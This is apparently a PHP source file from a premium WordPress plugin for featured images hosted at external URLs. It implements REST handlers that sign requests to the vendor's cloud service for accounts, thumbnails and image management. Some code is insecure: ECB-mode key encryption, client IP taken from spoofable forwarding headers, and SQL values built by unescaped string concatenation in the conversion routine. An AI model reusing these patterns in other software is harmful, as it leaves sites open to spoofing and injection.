<?php

define('FIFU_NO_CREDENTIALS', json_encode(array('code' => 'no_credentials')));
define('FIFU_SU_ADDRESS', FIFU_CLOUD_DEBUG && fifu_is_local() ? 'http://0.0.0.0:8080' : 'https://ws.fifu.app');
define('FIFU_ISBN_ADDRESS', 'https://us-central1-fifu-cloud-run-project.cloudfunctions.net/isbn-validation');
define('FIFU_QUERY_ADDRESS', 'https://query.featuredimagefromurl.com');
define('FIFU_SURVEY_ADDRESS', 'https://survey.featuredimagefromurl.com');
define('FIFU_ENABLE_SIZES_ADDRESS', 'https://enable-sizes.fifu.workers.dev');
define('FIFU_CLIENT', 'fifu-premium');

function fifu_try_again_later() {
    $strings = fifu_get_strings_api();
    return json_encode(array('code' => 0, 'message' => $strings['info']['try'](), 'color' => 'orange'));
}

function fifu_is_local() {
    $query = 'http://localhost';
    return substr(get_home_url(), 0, strlen($query)) === $query;
}

function fifu_remote_post($endpoint, $array) {
    return fifu_is_local() ? wp_remote_post($endpoint, $array) : wp_safe_remote_post($endpoint, $array);
}

function fifu_api_image_url(WP_REST_Request $request) {
    $param = $request['post_id'];
    return fifu_main_image_url($param, true);
}

function fifu_api_sign_up(WP_REST_Request $request) {
    $first_name = $request['first_name'];
    $last_name = $request['last_name'];
    $email = $request['email'];
    $site = fifu_get_home_url();

    fifu_cloud_log(['sign_up' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'first_name' => $first_name,
                    'last_name' => $last_name,
                    'email' => $email,
                    'public_key' => fifu_create_keys($email),
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 120,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/sign-up/', $array);
    if (is_wp_error($response) || $response['response']['code'] == 404) {
        fifu_delete_credentials();
        return json_decode(fifu_try_again_later());
    }

    $json = json_decode($response['http_response']->get_response_object()->body);
    if ($json->code <= 0) {
        fifu_delete_credentials();
        return $json;
    }

    $privKey = openssl_decrypt(base64_decode(get_option('fifu_su_privkey')[0]), "AES-128-ECB", $email . $site);
    if ($privKey) {
        openssl_private_decrypt(base64_decode($json->qrcode), $decrypted, $privKey);
        $json->qrcode = $decrypted;
    }

    return $json;
}

function fifu_delete_credentials() {
    delete_option('fifu_su_privkey');
    delete_option('fifu_su_email');
    delete_option('fifu_proxy_auth');
}

function fifu_api_login(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $email = $request['email'];
    $site = fifu_get_home_url();
    $tfa = $request['tfa'];
    $always_connected = filter_var($request['always-connected'], FILTER_VALIDATE_BOOLEAN);
    update_option('fifu_su_always_connected', $always_connected, 'no');
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $email . $time . $ip . $tfa);

    fifu_cloud_log(['login' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'email' => $email,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'proxy_auth' => get_option('fifu_proxy_auth') ? true : false,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number(),
                    'always_connected' => $always_connected
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/login/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);
    $json->fifu_tfa_hash = hash('sha512', $tfa);

    if (isset($json->proxy_key)) {
        $privKey = openssl_decrypt(base64_decode(get_option('fifu_su_privkey')[0]), "AES-128-ECB", $email . $site);
        if ($privKey) {
            openssl_private_decrypt(base64_decode($json->proxy_key), $key, $privKey);
            openssl_private_decrypt(base64_decode($json->proxy_salt), $salt, $privKey);
            update_option('fifu_proxy_auth', array($key, $salt));
        }
    }

    return $json;
}

function fifu_api_logout(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $email = fifu_su_get_email();
    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $email . $time . $ip . $tfa);

    fifu_cloud_log(['logout' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'email' => $email,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/logout/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);
    if ($json->code == 8)
        setcookie('fifu-tfa', '');

    return $json;
}

function fifu_api_cancel(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $time . $ip . $tfa);

    fifu_cloud_log(['cancel' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/cancel/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);

    return $json;
}

function fifu_api_payment_info(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $time . $ip . $tfa);

    fifu_cloud_log(['payment_info' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/payment-info/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);

    return $json;
}

function fifu_api_connected(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $email = fifu_su_get_email();
    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $email . $time . $ip . $tfa);

    fifu_cloud_log(['connected' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'email' => $email,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/connected/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    // offline
    if ($response['http_response']->get_response_object()->status_code == 404)
        return json_decode(fifu_try_again_later());

    // enable lazy load
    update_option('fifu_lazy', 'toggleon');

    return json_decode($response['http_response']->get_response_object()->body);
}

function fifu_get_ip() {
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                    return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'];
}

function fifu_api_create_thumbnails_list(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $images = $request['selected'];
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];

    return fifu_create_thumbnails_list($images, $tfa, false);
}

function fifu_create_thumbnails_list($images, $tfa = null, $cron = false) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    if ($cron) {
        $code = get_option('fifu_cloud_upload_auto_code');
        if (!$code)
            return json_decode(FIFU_NO_CREDENTIALS);
        $tfa = $code[0];
    }

    $sent_urls = array();
    $saved_urls = array();

    $rows = array();
    $total = count($images);
    $url_sign = '';
    foreach ($images as $image) {
        if (!$cron) {
            // manual
            $post_id = $image[0];
            $url = $image[1];
            $meta_key = $image[2];
            $meta_id = $image[3];
            $is_category = $image[4] == 1;
            $video_url = $image[5];
        } else {
            // upload auto
            $post_id = $image->post_id;
            $url = $image->url;
            $meta_key = $image->meta_key;
            $meta_id = $image->meta_id;
            $is_category = $image->category == 1;
            $video_url = $image->video_url;

            if (fifu_db_get_attempts_invalid_media_su($url) >= 5)
                continue;
            array_push($sent_urls, $url);
        }

        if (!$url || !$post_id)
            continue;

        $encoded_url = base64_encode($url);
        $encoded_video_url = $video_url ? base64_encode($video_url) : '';
        array_push($rows, array($post_id, $encoded_url, $meta_key, $meta_id, $is_category, $encoded_video_url));
        $url_sign .= substr($encoded_url, -10);

        fifu_cloud_log(['create_thumbnails_list' => ['post_id' => $post_id, 'meta_key' => $meta_key, 'meta_id' => $meta_id, 'is_category' => $is_category, 'video_url' => $video_url, 'url' => $url]]);
    }
    $time = time();
    $ip = fifu_get_ip();
    $site = fifu_get_home_url();
    $signature = fifu_create_signature($url_sign . $site . $time . $ip . $tfa);
    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'rows' => $rows,
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'upload_auto' => $cron,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 300,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/create-thumbnails/', $array);
    if (is_wp_error($response))
        return;

    $json = json_decode($response['http_response']->get_response_object()->body);
    $code = $json->code;
    if ($code && $code > 0) {
        if (count((array) $json->thumbnails) > 0) {
            $category_images = array();
            $post_images = array();
            foreach ((array) $json->thumbnails as $thumbnail) {
                if ($thumbnail->is_category)
                    array_push($category_images, $thumbnail);
                else
                    array_push($post_images, $thumbnail);

                array_push($saved_urls, $thumbnail->meta_value);
            }
            if (count($category_images) > 0)
                fifu_ctgr_add_urls_su($json->bucket_id, $category_images);

            if (count($post_images) > 0)
                fifu_add_urls_su($json->bucket_id, $post_images);
        }

        // check invalid images
        if ($cron && count($sent_urls) > count($saved_urls)) {
            fifu_db_create_table_invalid_media_su();
            foreach ($sent_urls as $sent_url) {
                if (!in_array($sent_url, $saved_urls))
                    fifu_db_insert_invalid_media_su($sent_url);
                else
                    fifu_db_delete_invalid_media_su($sent_url);
            }
        }
    }

    return $json;
}

function fifu_api_delete(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $rows = array();
    $images = $request['selected'];
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $total = count($images);
    $url_sign = '';
    foreach ($images as $image) {
        $storage_id = $image['storage_id'];
        if (!$storage_id)
            continue;

        array_push($rows, $storage_id);
        $url_sign .= $storage_id;
    }
    $time = time();
    $ip = fifu_get_ip();
    $site = fifu_get_home_url();
    $signature = fifu_create_signature($url_sign . $site . $time . $ip . $tfa);

    fifu_cloud_log(['delete' => ['rows' => $rows]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'rows' => $rows,
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 60,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/delete/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);
    if (!$json)
        return null;

    $code = $json->code;
    if ($code && $code > 0) {
        if (count((array) $json->urls) > 0) {
            $map = array();
            $posts = fifu_get_posts_su($rows);
            foreach ($posts as $post)
                $map[$post->storage_id] = $post;

            $category_images = array();
            $post_images = array();
            foreach ($posts as $post) {
                if ($post->category)
                    array_push($category_images, $post);
                else
                    array_push($post_images, $post);
            }

            if (count($post_images) > 0)
                fifu_remove_urls_su($json->bucket_id, $post_images, (array) $json->urls, (array) $json->video_urls);

            if (count($category_images) > 0)
                fifu_ctgr_remove_urls_su($json->bucket_id, $category_images, (array) $json->urls, (array) $json->video_urls);

            return fifu_api_confirm_delete($rows, $site, $ip, $tfa, $url_sign);
        }
    }

    return $json;
}

function fifu_api_confirm_delete($rows, $site, $ip, $tfa, $url_sign) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $time = time();
    $signature = fifu_create_signature($url_sign . $site . $time . $ip . $tfa);

    fifu_cloud_log(['confirm_delete' => ['rows' => $rows]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'rows' => $rows,
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 300,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/confirm-delete/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);
    return $json;
}

function fifu_api_reset_credentials(WP_REST_Request $request) {
    fifu_delete_credentials();
    $email = $request['email'];
    $site = fifu_get_home_url();

    fifu_cloud_log(['reset_credentials' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'email' => $email,
                    'public_key' => fifu_create_keys($email),
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/reset-credentials/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());
    else {
        $json = json_decode($response['http_response']->get_response_object()->body);
        $privKey = openssl_decrypt(base64_decode(get_option('fifu_su_privkey')[0]), "AES-128-ECB", $email . $site);
        if (isset($json->qrcode)) {
            openssl_private_decrypt(base64_decode($json->qrcode), $decrypted, $privKey);
            $json->qrcode = $decrypted;
        }

        # unknown site
        if ($json->code == -21)
            fifu_delete_credentials();

        return $json;
    }
}

function fifu_api_list_all_su(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $time = time();
    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $page = (int) $request['page'];
    $ip = fifu_get_ip();
    $signature = fifu_create_signature($site . $time . $ip . $tfa);

    fifu_cloud_log(['list_all_su' => ['site' => $site, 'page' => $page]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'page' => $page,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/list-all/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    // offline
    if ($response['http_response']->get_response_object()->status_code == 404)
        return json_decode(fifu_try_again_later());

    $map = array();
    $posts = fifu_get_posts_su(null);
    foreach ($posts as $post)
        $map[$post->storage_id] = $post;

    $json = json_decode($response['http_response']->get_response_object()->body);
    if ($json && $json->code > 0) {
        for ($i = 0; $i < count($json->photo_data); $i++) {
            $post = $json->photo_data[$i];
            if (isset($map[$post->storage_id])) {
                $post->title = $map[$post->storage_id]->post_title;
                $post->meta_id = $map[$post->storage_id]->meta_id;
                $post->post_id = $map[$post->storage_id]->post_id;
                $post->meta_key = $map[$post->storage_id]->meta_key;
            } else
                $post->title = $post->meta_id = $post->post_id = $post->meta_key = '';
            $is_video = strpos($post->meta_key, 'video') !== false;
            $post->proxy_url = fifu_speedup_get_signed_url(null, 128, 128, $json->bucket_id, $post->storage_id, $is_video);
        }
    }
    return $json;
}

function fifu_api_list_daily_count(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $time = time();
    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $signature = fifu_create_signature($site . $time . $ip . $tfa);

    fifu_cloud_log(['list_daily_count' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/list-daily-count/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    // offline
    if ($response['http_response']->get_response_object()->status_code == 404)
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);
    return $json;
}

function fifu_api_cloud_upload_auto(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $email = fifu_su_get_email();
    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $email . $time . $ip . $tfa);

    $enabled = $request['toggle'] == 'toggleon';

    fifu_cloud_log(['cloud_upload_auto' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'email' => $email,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'enabled' => $enabled,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );

    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/upload-auto/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);
    $upload_auto_code = $json->upload_auto_code;

    if ($enabled)
        update_option('fifu_cloud_upload_auto_code', array($upload_auto_code));
    else
        delete_option('fifu_cloud_upload_auto_code');

    return $json;
}

function fifu_api_cloud_hotlink(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_decode(FIFU_NO_CREDENTIALS);

    $email = fifu_su_get_email();
    $site = fifu_get_home_url();
    $tfa = get_option('fifu_su_always_connected') ? '' : $request['tfa'];
    $ip = fifu_get_ip();
    $time = time();
    $signature = fifu_create_signature($site . $email . $time . $ip . $tfa);

    $enabled = $request['toggle'] == 'toggleon';

    fifu_cloud_log(['cloud_hotlink' => ['site' => $site]]);

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'site' => $site,
                    'email' => $email,
                    'signature' => $signature,
                    'time' => $time,
                    'ip' => $ip,
                    'enabled' => $enabled,
                    'slug' => FIFU_CLIENT,
                    'version' => fifu_version_number()
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );

    $response = fifu_remote_post(FIFU_SU_ADDRESS . '/hotlink/', $array);
    if (is_wp_error($response))
        return json_decode(fifu_try_again_later());

    $json = json_decode($response['http_response']->get_response_object()->body);

    return $json;
}

function fifu_api_valid_isbn($isbn) {
    $site = fifu_get_home_url();
    $email = get_option('fifu_email');

    if (!$isbn || !$email || !$site)
        return false;

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode(
                array(
                    'email' => $email,
                    'site' => $site,
                    'isbn' => $isbn,
                    'version' => fifu_version_number(),
                )
        ),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_ISBN_ADDRESS, $array);
    if (is_wp_error($response))
        return null;

    $json = json_decode($response['http_response']->get_response_object()->body);
    return $json;
}

function fifu_api_query($dataset) {
    $requests = array();

    $version = fifu_version_number();
    $site = fifu_get_home_url();

    foreach ($dataset as $data) {
        $post_id = $data[0];

        if (get_post_meta($post_id, 'fifu_dataset', true) == 2)
            continue;

        $old_url = $data[1];
        $new_url = $data[2];
        $title = $data[3];
        $permalink = $data[4];

        $time = time();
        $encoded_permalink = base64_encode($permalink);
        $permalink_sign = substr($encoded_permalink, -15);
        $signature = hash_hmac('sha256', $permalink_sign . $time, $new_url);

        array_push($requests,
                array(
                    'old_url' => base64_encode($old_url),
                    'new_url' => base64_encode($new_url),
                    'title' => base64_encode($title),
                    'permalink' => $encoded_permalink,
                    'time' => $time,
                    'signature' => $signature,
                    'version' => $version,
                    'site' => $site,
                    'premium' => true,
                )
        );
    }

    $array = array(
        'headers' => array('Content-Type' => 'application/json; charset=utf-8'),
        'body' => json_encode($requests),
        'method' => 'POST',
        'data_format' => 'body',
        'blocking' => true,
        'timeout' => 30,
    );
    $response = fifu_remote_post(FIFU_QUERY_ADDRESS, $array);
    if (is_wp_error($response))
        return null;

    $json = json_decode($response['http_response']->get_response_object()->body);
    if (isset($json->code) && in_array($json->code, array(200, 403))) {
        foreach ($dataset as $data) {
            $post_id = $data[0];
            update_post_meta($post_id, 'fifu_dataset', 2);
        }
    }
}

function fifu_api_upload_images(WP_REST_Request $request) {
    $att_ids = array();

    // featured
    $url = esc_url_raw(rtrim($request['url']));
    $alt = wp_strip_all_tags($request['alt']);

    // gallery
    $urls = rtrim($request['urls']);
    $urls = $urls ? explode('|', $urls) : array();
    $alts = wp_strip_all_tags($request['alts']);
    $alts = $alts ? explode('|', $alts) : array();

    $local_url = null;

    $post_id = $request['post_id'];
    $meta_box = filter_var($request['meta_box'], FILTER_VALIDATE_BOOLEAN);
    $is_category = $request['taxonomy'] == 'product_cat';
    $att_id = fifu_upload_image($post_id, $url, $alt, $is_category);
    if ($att_id) {
        if ($meta_box)
            array_push($att_ids, $att_id);
        else
            $local_url = wp_get_attachment_image_src($att_id, 'full')[0];

        if (!$is_category) {
            delete_post_meta($post_id, 'fifu_image_url');
            delete_post_meta($post_id, 'fifu_image_alt');
            fifu_db_update_fake_attach_id($post_id);
            set_post_thumbnail($post_id, $att_id);
        } else {
            delete_term_meta($post_id, 'fifu_image_url');
            delete_term_meta($post_id, 'fifu_image_alt');
            fifu_db_ctgr_update_fake_attach_id($post_id);
            update_term_meta($post_id, 'thumbnail_id', $att_id);
        }
        // alt
        update_post_meta($att_id, '_wp_attachment_image_alt', $alt);
        // description
        wp_update_post(array('ID' => $att_id, 'post_content' => $url));
    }

    // gallery
    for ($i = 0; $i < sizeof($urls); $i++) {
        $att_id = fifu_upload_image($post_id, $urls[$i], $alts[$i], false);
        if ($att_id)
            array_push($att_ids, (int) $att_id);
    }

    if (!$meta_box) {
        update_post_meta($post_id, '_product_image_gallery', implode(',', $att_ids));
        if (!empty(get_metadata('post', $post_id, 'fifu_list_url'))) {
            $i = 0;
            while (true) {
                $url = get_post_meta($post_id, 'fifu_image_url_' . $i, true);
                if ($url) {
                    delete_post_meta($post_id, 'fifu_image_url_' . $i);
                    delete_post_meta($post_id, 'fifu_image_alt_' . $i);
                } else
                    break;
                $i++;
            }
            delete_post_meta($post_id, 'fifu_list_url');
            delete_post_meta($post_id, 'fifu_list_alt');
        }

        return json_encode(array('local_url' => $local_url));
    }

    return json_encode(array('att_ids' => $att_ids));
}

function fifu_get_storage_id($hex_id, $width, $height) {
    return $hex_id . '-' . $width . '-' . $height;
}

function fifu_api_list_all_fifu(WP_REST_Request $request) {
    $page = (int) $request['page'];
    $urls = fifu_db_get_all_urls($page);
    foreach ($urls as $url) {
        if (strpos($url->meta_key, 'video') !== false) {
            $url->video_url = $url->url;
            $url->url = fifu_video_img_large($url->url, $url->post_id, $url->category);
        }
    }
    return $urls;
}

function fifu_api_list_all_media_library(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return null;

    $page = (int) $request['page'];
    return fifu_db_get_posts_with_internal_featured_image($page);
}

function fifu_api_convert_to_fifu(WP_REST_Request $request) {
    if (!fifu_su_sign_up_complete())
        return json_encode(array());

    $rows = array();
    $posts = $request['selected'];
    $total = count($posts);

    $post_ids = array();
    $term_ids = array();

    foreach ($posts as $post) {
        $post_id = $post[0];
        $url = $post[1];
        $thumbnail_id = $post[2];
        $gallery_ids = $post[3];
        $is_category = $post[4] == 1;

        if (!$url || !$post_id)
            continue;

        if ($is_category)
            array_push($term_ids, $post_id);
        else
            array_push($post_ids, $post_id);
    }

    if ($post_ids)
        fifu_backup_att_ids($post_ids);

    if ($term_ids)
        fifu_ctgr_backup_att_ids($term_ids);

    if ($post_ids) {
        $map = array();
        $results = fifu_db_get_internal_urls($post_ids);
        foreach ($results as $res) {
            $att_id = $res->att_id;
            $url = $res->url;
            $map[$att_id] = $url;
        }
    }

    if ($term_ids) {
        $ctgr_map = array();
        $ctgr_results = fifu_db_get_ctgr_internal_urls($term_ids);
        foreach ($ctgr_results as $res) {
            $att_id = $res->att_id;
            $url = $res->url;
            $ctgr_map[$att_id] = $url;
        }
    }

    $values = '';
    $ctgr_values = '';
    foreach ($posts as $post) {
        $post_id = $post[0];
        $url = $post[1];
        $thumbnail_id = $post[2];
        $gallery_ids = $post[3];
        $is_category = $post[4] == 1;

        if ($is_category) {
            if ($thumbnail_id)
                $ctgr_values .= '(' . $post_id . ', "fifu_image_url", "' . $ctgr_map[$thumbnail_id] . '")';
        } else {
            if ($thumbnail_id)
                $values .= '(' . $post_id . ', "fifu_image_url", "' . $map[$thumbnail_id] . '")';

            if ($gallery_ids) {
                $ids = explode(',', $gallery_ids);
                $i = 0;
                foreach ($ids as $id)
                    $values .= '(' . $post_id . ', "fifu_image_url_' . $i++ . '", "' . $map[$id] . '")';
            }
        }
    }

    if ($values) {
        $values = str_replace(')(', '), (', $values);
        fifu_add_custom_fields($values);
    }

    if ($ctgr_values) {
        $ctgr_values = str_replace(')(', '), (', $ctgr_values);
        fifu_ctgr_add_custom_fields($ctgr_values);
    }

    if ($post_ids)
        fifu_delete_att_ids($post_ids);

    if ($term_ids)
        fifu_ctgr_delete_att_ids($term_ids);

    fifu_db_change_url_length();
    fifu_db_insert_attachment();
    fifu_db_insert_attachment_gallery();
    fifu_db_insert_attachment_category();

    return json_encode(array());
}

function fifu_enable_fake_api(WP_REST_Request $request) {
    update_option('fifu_fake_stop', false, 'no');
    fifu_enable_fake();
    set_transient('fifu_image_metadata_counter', fifu_db_count_urls_without_metadata(), 0);
    return json_encode(array());
}

function fifu_disable_fake_api(WP_REST_Request $request) {
    update_option('fifu_fake_created', false, 'no');
    update_option('fifu_fake_stop', true, 'no');
    set_transient('fifu_image_metadata_counter', fifu_db_count_urls_without_metadata(), 0);
    return json_encode(array());
}

function fifu_data_clean_api(WP_REST_Request $request) {
    fifu_db_enable_clean();
    update_option('fifu_data_clean', 'toggleoff', 'no');
    set_transient('fifu_image_metadata_counter', fifu_db_count_urls_without_metadata(), 0);
    fifu_set_author();
    return json_encode(array());
}

function fifu_update_all_api(WP_REST_Request $request) {
    update_option('fifu_update_all', 'toggleoff', 'no');
    fifu_db_update_all();
    return json_encode(array());
}

function fifu_run_delete_all_api(WP_REST_Request $request) {
    fifu_db_delete_all();
    update_option('fifu_run_delete_all', 'toggleoff', 'no');
    return json_encode(array());
}

function fifu_disable_default_api(WP_REST_Request $request) {
    fifu_db_delete_default_url();
    return json_encode(array());
}

function fifu_none_default_api(WP_REST_Request $request) {
    return json_encode(array());
}

function fifu_dev_upload_all_images_api(WP_REST_Request $request) {
    fifu_dev_upload_all_images();
    sleep(5);
    return json_encode(array());
}

